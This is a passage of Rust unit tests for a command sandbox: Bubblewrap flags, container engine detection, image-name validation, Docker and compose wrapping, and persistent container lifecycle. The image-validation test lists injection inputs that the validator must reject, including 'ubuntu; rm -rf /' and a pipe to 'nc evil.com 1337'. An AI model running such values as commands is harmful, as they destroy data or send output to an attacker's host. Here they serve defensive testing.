        Ok(exec_cmd)
    }
}

/// RAII cleanup guard ensuring active compose and persistent sandboxes stop on scope exit.
#[derive(Debug, Default)]
pub struct SandboxCleanupGuard;

impl Drop for SandboxCleanupGuard {
    /// Tear down any active compose environments and persistent containers when dropped.
    fn drop(&mut self) {
        PersistentSandbox::stop();
        ComposeSandbox::teardown_all();
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    /// Closure type mapping mocked sandbox commands to synthetic [`ExecOutput`] values.
    type SandboxResponder = Box<dyn Fn(&str, &[String]) -> ExecOutput + Send + Sync>;

    /// Configurable mock [`SandboxEnv`] for unit-testing command building and engine probing.
    struct MockSandboxEnv {
        /// Simulated host OS.
        os: HostOs,
        /// Available executable names on `PATH`.
        bins: HashSet<String>,
        /// Simulated working directory.
        cwd: PathBuf,
        /// Simulated POSIX `(uid, gid)`.
        uid_gid: Option<(u32, u32)>,
        /// Simulated current PID.
        pid: u32,
        /// Live PIDs for `is_pid_alive`.
        alive_pids: HashSet<u32>,
        /// Optional `$XDG_CACHE_HOME` override.
        xdg_cache: Option<PathBuf>,
        /// Optional `$HOME` override.
        home: Option<PathBuf>,
        /// Recorded `(program, args)` invocations.
        calls: Mutex<Vec<(String, Vec<String>)>>,
        /// Recorded warning messages emitted via [`SandboxEnv::warn`].
        warnings: Mutex<Vec<String>>,
        /// Custom responder mapping `(program, args)` to [`ExecOutput`].
        responder: SandboxResponder,
    }

    impl MockSandboxEnv {
        /// Create a default Linux mock environment with `/workspace` CWD and UID/GID 1000.
        fn linux_default() -> Self {
            Self {
                os: HostOs::Linux,
                bins: HashSet::new(),
                cwd: PathBuf::from("/workspace"),
                uid_gid: Some((1000, 1000)),
                pid: 4242,
                alive_pids: HashSet::from([4242]),
                xdg_cache: None,
                home: Some(PathBuf::from("/home/tester")),
                calls: Mutex::new(Vec::new()),
                warnings: Mutex::new(Vec::new()),
                responder: Box::new(|_, _| ExecOutput {
                    code: 0,
                    stdout: String::new(),
                    stderr: String::new(),
                }),
            }
        }

        /// Return recorded subprocess invocations.
        fn recorded_calls(&self) -> Vec<(String, Vec<String>)> {
            self.calls.lock().unwrap_or_else(|e| e.into_inner()).clone()
        }

        /// Return recorded warning messages.
        fn recorded_warnings(&self) -> Vec<String> {
            self.warnings.lock().unwrap_or_else(|e| e.into_inner()).clone()
        }
    }

    impl SandboxEnv for MockSandboxEnv {
        /// Return simulated OS.
        fn os(&self) -> HostOs {
            self.os
        }

        /// Return simulated binary path if present in `bins`.
        fn which(&self, bin: &str) -> Option<PathBuf> {
            self.bins
                .contains(bin)
                .then(|| PathBuf::from(format!("/usr/bin/{bin}")))
        }

        /// Return simulated CWD.
        fn cwd(&self) -> Result<PathBuf, RunError> {
            Ok(self.cwd.clone())
        }

        /// Return simulated `(uid, gid)`.
        fn uid_gid(&self) -> Option<(u32, u32)> {
            self.uid_gid
        }

        /// Return simulated PID.
        fn current_pid(&self) -> u32 {
            self.pid
        }

        /// Check simulated live PID set.
        fn is_pid_alive(&self, pid: u32) -> bool {
            self.alive_pids.contains(&pid)
        }

        /// Return simulated `$XDG_CACHE_HOME`.
        fn xdg_cache_home(&self) -> Option<PathBuf> {
            self.xdg_cache.clone()
        }

        /// Return simulated `$HOME`.
        fn home_dir(&self) -> Option<PathBuf> {
            self.home.clone()
        }

        /// Record invocation and delegate to `self.responder`.
        fn run_capture(
            &self,
            program: &str,
            args: &[String],
            _timeout: Option<Duration>,
        ) -> Result<ExecOutput, RunError> {
            self.calls
                .lock()
                .unwrap_or_else(|e| e.into_inner())
                .push((program.to_string(), args.to_vec()));
            Ok((self.responder)(program, args))
        }

        /// Capture warning messages for `.dockerignore` assertions.
        fn warn(&self, msg: &str) {
            self.warnings
                .lock()
                .unwrap_or_else(|e| e.into_inner())
                .push(msg.to_string());
        }
    }

    /// Helper converting string slices to `Vec<String>`.
    fn strs(items: &[&str]) -> Vec<String> {
        items.iter().map(|s| (*s).to_string()).collect()
    }

    /// Create a temporary directory for Dockerfile tests.
    fn make_temp_dir(label: &str) -> PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("clock")
            .as_nanos();
        let dir = std::env::temp_dir().join(format!(
            "run_sandbox_test_{label}_{}_{}",
            std::process::id(),
            nanos
        ));
        fs::create_dir_all(&dir).expect("create temp dir");
        dir
    }

    /// Port of `dev:tests/test_sandbox.py::TestNativeRestrictor::test_bwrap_command_construction_linux`.
    #[test]
    fn test_native_restrictor_bwrap_linux_and_os_errors() {
        let mut env = MockSandboxEnv::linux_default();
        env.bins.insert("bwrap".into());

        let cmd = strs(&["gcc", "main.c", "-o", "main.out"]);
        let wrapped = NativeRestrictor::wrap_command_with(
            &cmd,
            false,
            Some(Path::new("/workspace")),
            true,
            &env,
        )
        .expect("bwrap wrap");

        assert_eq!(wrapped[0], "bwrap");
        assert!(wrapped.contains(&"--ro-bind".to_string()));
        assert!(wrapped.contains(&"--unshare-user".to_string()));
        assert!(wrapped.contains(&"--unshare-ipc".to_string()));
        assert!(wrapped.contains(&"--unshare-pid".to_string()));
        assert!(wrapped.contains(&"--unshare-uts".to_string()));
        assert!(wrapped.contains(&"--unshare-cgroup-try".to_string()));
        assert!(wrapped.contains(&"--die-with-parent".to_string()));
        assert!(wrapped.contains(&"--new-session".to_string()));
        assert!(wrapped.contains(&"--unshare-net".to_string()));
        assert!(wrapped.contains(&"--bind".to_string()));
        assert!(wrapped
            .iter()
            .any(|p| p.replace('\\', "/") == "/home/tester/.cache/run"));

        for masked in ["/home", "/root", "/run", "/sys", "/tmp"] {
            let idx = wrapped.iter().position(|t| t == masked).expect("masked dir");
            assert_eq!(wrapped[idx - 1], "--tmpfs");
        }
        assert_eq!(&wrapped[wrapped.len() - 5..], &strs(&["--", "gcc", "main.c", "-o", "main.out"]));

        // Network toggle and non-compiling ro-bind
        let with_net = NativeRestrictor::wrap_command_with(
            &strs(&["python", "app.py"]),
            true,
            Some(Path::new("/app")),
            false,
            &env,
        )
        .expect("bwrap net");
        assert!(!with_net.contains(&"--unshare-net".to_string()));
        assert!(with_net.contains(&"--ro-bind".to_string()));

        // Missing bwrap binary
        env.bins.clear();
        let err = NativeRestrictor::wrap_command_with(&strs(&["ls"]), false, None, false, &env)
            .expect_err("missing bwrap");
        assert!(err.to_string().contains("Bubblewrap"));

        // macOS and Windows fail closed
        env.os = HostOs::MacOs;
        let mac_err = NativeRestrictor::wrap_command_with(&strs(&["ls"]), false, None, false, &env)
            .expect_err("macos fail closed");
        assert!(mac_err.to_string().contains("only supported on Linux"));

        env.os = HostOs::Windows;
        let win_err = NativeRestrictor::wrap_command_with(&strs(&["dir"]), false, None, false, &env)
            .expect_err("windows fail closed");
        assert!(win_err.to_string().contains("only supported on Linux"));
    }

    /// Port of `dev:tests/test_sandbox.py::TestContainerSandbox` engine detection & heuristics.
    #[test]
    fn test_container_engine_detection_and_heuristics() {
        let mut env = MockSandboxEnv::linux_default();
        assert!(ContainerSandbox::get_engine_with(&env).is_err());

        env.bins.insert("podman".into());
        assert_eq!(
            ContainerSandbox::get_engine_with(&env).expect("podman"),
            "podman"
        );

        env.bins.insert("docker".into());
        assert_eq!(
            ContainerSandbox::get_engine_with(&env).expect("docker priority"),
            "docker"
        );

        assert_eq!(
            ContainerSandbox::get_heuristic_image(&strs(&["gcc", "main.c"])),
            "gcc:latest"
        );
        assert_eq!(
            ContainerSandbox::get_heuristic_image(&strs(&["g++", "main.cpp"])),
            "gcc:latest"
        );
        assert_eq!(
            ContainerSandbox::get_heuristic_image(&strs(&["python", "script.py"])),
            "python:3-slim"
        );
        assert_eq!(
            ContainerSandbox::get_heuristic_image(&strs(&["rustc", "main.rs"])),
            "rust:latest"
        );
        assert_eq!(
            ContainerSandbox::get_heuristic_image(&strs(&["javac", "Main.java"])),
            "openjdk:latest"
        );
        assert_eq!(
            ContainerSandbox::get_heuristic_image(&strs(&["go", "run", "."])),
            "golang:latest"
        );
        assert_eq!(
            ContainerSandbox::get_heuristic_image(&strs(&["node", "index.js"])),
            "node:latest"
        );
        assert_eq!(
            ContainerSandbox::get_heuristic_image(&strs(&["ruby", "app.rb"])),
            "ruby:latest"
        );
        assert_eq!(
            ContainerSandbox::get_heuristic_image(&strs(&["unknown_tool"])),
            "ubuntu:latest"
        );
    }

    /// Port of `dev:tests/test_sandbox.py::TestContainerSandbox` image validation (including `.trim()`).
    #[test]
    fn test_validate_image_name_and_trimming() {
        let valid = [
            "ubuntu:latest",
            "gcc:12.2",
            "python:3-slim",
            "docker.io/library/alpine:3.18",
            "ghcr.io/org/repo/app:v1.0.0",
            "localhost:5000/custom-img:latest",
            "alpine@sha256:e7d88de73db3d3a9418d76fb8f20a1377e59e651e6bdd7a666acdbd84bf960bc",
        ];
        for img in valid {
            assert_eq!(
                ContainerSandbox::validate_image_name(img).expect("valid"),
                img
            );
        }
        assert_eq!(
            ContainerSandbox::validate_image_name("  ubuntu:latest \n").expect("trimmed"),
            "ubuntu:latest"
        );

        let invalid = [
            "--privileged",
            "-v /:/host ubuntu",
            "--network host alpine",
            "ubuntu; rm -rf /",
            "alpine | nc evil.com 1337",
            "image`whoami`",
            "image$(id)",
            "image name with spaces",
            "",
            "   ",
        ];
        for bad in invalid {
            assert!(
                ContainerSandbox::validate_image_name(bad).is_err(),
                "expected rejection for {bad:?}"
            );
        }
    }

    /// Port of `dev:tests/test_sandbox.py::TestContainerSandbox` command wrapping & kill helper.
    #[test]
    fn test_container_wrap_command_flags_env_user_and_kill() {
        let mut env = MockSandboxEnv::linux_default();
        env.bins.insert("docker".into());

        let cmd = strs(&["python", "main.py"]);
        let mut custom_env = BTreeMap::new();
        custom_env.insert("APP_ENV".into(), "production".into());
        let cfg = SandboxConfig {
            user: Some("1001:1001".into()),
            container_name: Some("custom-box-42".into()),
            ..SandboxConfig::default()
        };

        let wrapped = ContainerSandbox::wrap_command_with(
            &cmd,
            false,
            true,
            Some(&cfg),
            Some(&custom_env),
            &env,
        )
        .expect("wrap container");

        assert_eq!(wrapped[0], "docker");
        assert!(wrapped.contains(&"--security-opt=no-new-privileges".to_string()));
        assert!(wrapped.contains(&"--cap-drop=ALL".to_string()));
        assert!(wrapped.contains(&"/workspace:/workspace:rw".to_string()));
        assert!(!wrapped.contains(&"/tmp:/tmp".to_string()));
        assert!(wrapped.contains(&"1001:1001".to_string()));
        assert!(wrapped.contains(&"none".to_string()));
        assert!(wrapped.contains(&"APP_ENV=production".to_string()));
        assert_eq!(
            ContainerSandbox::extract_container_name(&wrapped),
            Some("custom-box-42")
        );

        // Read-only mount when not compiling and default UID:GID
        let wrapped_ro = ContainerSandbox::wrap_command_with(&cmd, true, false, None, None, &env)
            .expect("wrap ro");
        assert!(wrapped_ro.contains(&"/workspace:/workspace:ro".to_string()));
        assert!(wrapped_ro.contains(&"1000:1000".to_string()));
        assert!(!wrapped_ro.contains(&"--network".to_string()));
        assert!(ContainerSandbox::extract_container_name(&wrapped_ro)
            .is_some_and(|n| n.starts_with("run-sandbox-")));

        // Kill container helper
        ContainerSandbox::kill_container_with("docker", "custom-box-42", &env);
        let calls = env.recorded_calls();
        assert!(calls
            .iter()
            .any(|(prog, args)| prog == "docker" && args == &strs(&["kill", "custom-box-42"])));
    }

    /// Port of `dev:tests/test_sandbox.py::TestContainerSandbox` Dockerfile hashing & build caching.
    #[test]
    fn test_container_build_dockerfile_caching_and_copy_mtime() {
        let tmp = make_temp_dir("dockerfile");
        let df = tmp.join("Dockerfile");
        fs::write(&df, "FROM alpine\nCOPY . /app\n").expect("write Dockerfile");

        let mut env = MockSandboxEnv::linux_default();
        env.cwd = tmp.clone();
        env.responder = Box::new(|_, args| {
            if args.first().map(String::as_str) == Some("images") {
                ExecOutput {
                    code: 0,
                    stdout: "image-id-123\n".into(),
                    stderr: String::new(),
                }
            } else {
                ExecOutput {
                    code: 0,
                    stdout: String::new(),
                    stderr: String::new(),
                }
            }
        });

        // Missing `.dockerignore` must emit a warning.
        let img = ContainerSandbox::build_dockerfile_with(&df, "docker", &env)
            .expect("build cached");
        assert!(img.starts_with("run-sandbox-"));
        assert!(env
            .recorded_warnings()
            .iter()
            .any(|w| w.contains("No .dockerignore found in build context")));

        // Missing Dockerfile errors.
        assert!(
            ContainerSandbox::build_dockerfile_with(&tmp.join("missing"), "docker", &env).is_err()
        );

        // Creating `.dockerignore` suppresses the warning AND updates directory mtime (`COPY`),
        // invalidating the cached image tag.
        std::thread::sleep(Duration::from_millis(20));
        fs::write(tmp.join(".dockerignore"), "target/\n").expect("write .dockerignore");

        let env_rebuild = MockSandboxEnv {
            os: HostOs::Linux,
            bins: HashSet::from(["docker".into()]),
            cwd: tmp.clone(),
            uid_gid: Some((1000, 1000)),
            pid: 4242,
            alive_pids: HashSet::new(),
            xdg_cache: None,
            home: None,
            calls: Mutex::new(Vec::new()),
            warnings: Mutex::new(Vec::new()),
            responder: Box::new(|_, _| ExecOutput {
                code: 0,
                stdout: String::new(),
                stderr: String::new(),
            }),
        };
        let img2 = ContainerSandbox::build_dockerfile_with(&df, "docker", &env_rebuild)
            .expect("rebuild");
        assert!(env_rebuild.recorded_warnings().is_empty());
        assert_ne!(
            img, img2,
            "COPY context mtime change must invalidate Dockerfile image hash"
        );
        assert!(env_rebuild
            .recorded_calls()
            .iter()
            .any(|(p, a)| p == "docker" && a.first().map(String::as_str) == Some("build")));

        // Updating directory mtime again via new context file changes the hash again.
        std::thread::sleep(Duration::from_millis(20));
        fs::write(tmp.join("payload.txt"), "v2").expect("write payload");
        let img3 = ContainerSandbox::build_dockerfile_with(&df, "docker", &env_rebuild)
            .expect("rebuild after context mtime change");
        assert_ne!(img2, img3);

        let _ = fs::remove_dir_all(&tmp);
    }

    /// Regression test: bare `"Dockerfile"` symlinked outside `cwd` must pass `"."` (never `""`) as build context.
    #[cfg(unix)]
    #[test]
    fn test_bare_symlinked_dockerfile_outside_cwd_uses_dot_context() {
        let tmp = make_temp_dir("bare_symlink_df");
        let ws = tmp.join("workspace");
        let outside = tmp.join("outside");
        fs::create_dir_all(&ws).expect("mkdir ws");
        fs::create_dir_all(&outside).expect("mkdir outside");

        let outside_df = outside.join("Dockerfile");
        fs::write(&outside_df, "FROM alpine\nRUN echo ok\n").expect("write outside Dockerfile");
        std::os::unix::fs::symlink(&outside_df, ws.join("Dockerfile"))
            .expect("symlink Dockerfile");

        let mut env = MockSandboxEnv::linux_default();
        env.cwd = ws.clone();
        let img = ContainerSandbox::build_dockerfile_with(Path::new("Dockerfile"), "docker", &env)
            .expect("build symlinked bare Dockerfile");
        assert!(img.starts_with("run-sandbox-"));

        let calls = env.recorded_calls();
        let build_call = calls
            .iter()
            .find(|(prog, args)| prog == "docker" && args.first().map(String::as_str) == Some("build"))
            .expect("docker build invocation");
        let ctx_arg = build_call.1.last().expect("build context arg");
        assert_eq!(ctx_arg, ".", "bare symlinked Dockerfile context must be '.'");
        assert!(env
            .recorded_warnings()
            .iter()
            .any(|w| w.contains("build context '.'")));

        let _ = fs::remove_dir_all(&tmp);
    }

    /// Port of `dev:tests/test_sandbox.py::TestComposeSandbox`.
    #[test]
    fn test_compose_sandbox_setup_teardown_and_wrap() {
        let env = MockSandboxEnv::linux_default();
        let mut compose = ComposeSandbox::default();
        compose
            .setup_with("docker-compose.yml", &env)
            .expect("compose setup");
        assert_eq!(compose.active_files(), &["docker-compose.yml"]);

        compose.teardown_with("docker-compose.yml", &env);
        assert!(compose.active_files().is_empty());

        let calls = env.recorded_calls();
        assert_eq!(
            calls[0],
            (
                "docker".into(),
                strs(&["compose", "-f", "docker-compose.yml", "up", "-d"])
            )
        );
        assert_eq!(
            calls[1],
            (
                "docker".into(),
                strs(&["compose", "-f", "docker-compose.yml", "down"])
            )
        );

        // Setup failure
        let fail_env = MockSandboxEnv {
            responder: Box::new(|_, _| ExecOutput {
                code: 1,
                stdout: String::new(),
                stderr: "boom".into(),
            }),
            ..MockSandboxEnv::linux_default()
        };
        assert!(compose.setup_with("bad.yml", &fail_env).is_err());

        // Wrap command: no implicit host CWD `-w`, explicit compose_workdir supported
        let wrapped = ComposeSandbox::wrap_command_with(
            &strs(&["pytest", "tests/"]),
            "docker-compose.yml",
            "app",
            None,
            None,
            None,
            &env,
        );
        assert!(wrapped.contains(&"exec".to_string()));
        assert!(wrapped.contains(&"-T".to_string()));
        assert!(!wrapped.contains(&"-w".to_string()));
        assert!(wrapped.contains(&"1000:1000".to_string()));

        let mut custom_env = BTreeMap::new();
        custom_env.insert("KEY".into(), "VAL".into());
        let cfg = SandboxConfig {
            compose_workdir: Some("/app/work".into()),
            ..SandboxConfig::default()
        };
        let wrapped_custom = ComposeSandbox::wrap_command_with(
            &strs(&["pytest", "tests/"]),
            "docker-compose.yml",
            "app",
            None,
            Some(&custom_env),
            Some(&cfg),
            &env,
        );
        let w_idx = wrapped_custom
            .iter()
            .position(|t| t == "-w")
            .expect("explicit -w");
        assert_eq!(wrapped_custom[w_idx + 1], "/app/work");
        assert!(wrapped_custom.contains(&"KEY=VAL".to_string()));
    }

    /// Port of `dev:tests/test_sandbox.py::TestPersistentSandbox`.
    #[test]
    fn test_persistent_sandbox_lifecycle_and_orphan_reaping() {
        let mut persist = PersistentSandbox::default();
        assert!(persist.wrap_command(&strs(&["ls"]), None).is_err());

        let env = MockSandboxEnv {
            alive_pids: HashSet::from([4242]),
            responder: Box::new(|_, args| {
                if args.first().map(String::as_str) == Some("ps") {
                    ExecOutput {
                        code: 0,
                        stdout: "cid-dead 999999\ncid-self 4242\ncid-badpid abc\ncid-zero 0\n".into(),
                        stderr: String::new(),
                    }
                } else if args.first().map(String::as_str) == Some("run") {
                    ExecOutput {
                        code: 0,
                        stdout: "container-id-abc\n".into(),
                        stderr: String::new(),
                    }
                } else {
                    ExecOutput {
                        code: 0,
                        stdout: String::new(),
                        stderr: String::new(),
                    }
                }
            }),
            ..MockSandboxEnv::linux_default()
        };

        // Reap orphans directly: dead PID 999999, non-numeric pid, and pid 0 reap; live self PID 4242 kept.
        let reaped = PersistentSandbox::reap_orphaned_containers_with(Some("docker"), &env);
        assert_eq!(reaped, 3);
        assert!(!SystemSandboxEnv.is_pid_alive(0));
        assert!(!SystemSandboxEnv.is_pid_alive(u32::MAX));

        persist
            .start_with(
                "docker",
                "ubuntu:latest",
                false,
                Some(Path::new("/workspace")),
                false,
                &env,
            )
            .expect("start persistent");
        assert_eq!(persist.container_id(), Some("container-id-abc"));

        let calls = env.recorded_calls();
        let run_call = calls
            .iter()
            .find(|(_, a)| a.first().map(String::as_str) == Some("run"))
            .expect("run call");
        assert!(run_call.1.contains(&"/workspace:/workspace:ro".to_string()));
        assert!(run_call.1.contains(&"run.sandbox.persistent=true".to_string()));
        assert!(run_call.1.contains(&"--cap-drop=ALL".to_string()));

        let wrapped = persist
            .wrap_command_with(&strs(&["echo", "1"]), None, &env)
            .expect("wrap persistent");
        assert_eq!(
            wrapped,
            strs(&["docker", "exec", "-w", "/workspace", "container-id-abc", "echo", "1"])
        );

        persist.stop_with(&env);
        assert_eq!(persist.container_id(), None);
        assert_eq!(
            env.recorded_calls().last().expect("stop call"),
            &("docker".into(), strs(&["stop", "container-id-abc"]))
        );
    }

    /// Regression test: empty or whitespace-only `sandbox_cfg.user` must not emit `--user ""`.
    #[test]
    fn test_empty_or_whitespace_sandbox_user_falls_back_to_host_uid_gid() {
        let mut env = MockSandboxEnv::linux_default();
        env.bins.insert("docker".into());

        for blank_user in ["", "   ", "\t"] {
            let cfg = SandboxConfig {
                user: Some(blank_user.to_string()),
                ..SandboxConfig::default()
            };
            let container_cmd = ContainerSandbox::wrap_command_with(
                &strs(&["echo", "hi"]),
                false,
                false,
                Some(&cfg),
                None,
                &env,
            )
            .expect("wrap container");
            assert!(container_cmd.contains(&"1000:1000".to_string()));
            assert!(!container_cmd.contains(&blank_user.to_string()));

            let compose_cmd = ComposeSandbox::wrap_command_with(
                &strs(&["echo", "hi"]),
                "docker-compose.yml",
                "app",
                None,
                None,
                Some(&cfg),
                &env,
            );
            assert!(compose_cmd.contains(&"1000:1000".to_string()));
            assert!(!compose_cmd.contains(&blank_user.to_string()));
        }
    }

    /// White-box test: `MockSandboxEnv` (generated by `mockall::automock`) verifies exact
    /// Bubblewrap fail-closed behavior on non-Linux hosts and Linux `bwrap` network/ro flags.
    #[test]
    fn test_mockall_sandbox_env_bwrap_and_engine_fallback() {
        let mut mac_env = crate::model::sandbox::MockSandboxEnv::new();
        mac_env.expect_os().returning(|| HostOs::MacOs);
        let err = NativeRestrictor::wrap_command_with(
            &strs(&["./app"]),
            false,
            None,
            false,
            &mac_env,
        )
        .unwrap_err();
        assert!(err.to_string().contains("Linux"));

        let mut linux_env = crate::model::sandbox::MockSandboxEnv::new();
        linux_env.expect_os().returning(|| HostOs::Linux);
        linux_env
            .expect_which()
            .with(mockall::predicate::eq("bwrap"))
            .times(1)
            .returning(|_| Some(PathBuf::from("/usr/bin/bwrap")));
        linux_env
            .expect_cwd()
            .times(1)
            .returning(|| Ok(PathBuf::from("/workspace")));

        let wrapped = NativeRestrictor::wrap_command_with(
            &strs(&["./app"]),
            false,
            None,
            false,
            &linux_env,
        )
        .expect("bwrap wrap");
        assert_eq!(wrapped[0], "bwrap");
        assert!(wrapped.contains(&"--unshare-net".to_string()));
        assert!(wrapped.contains(&"--ro-bind".to_string()));
    }
}
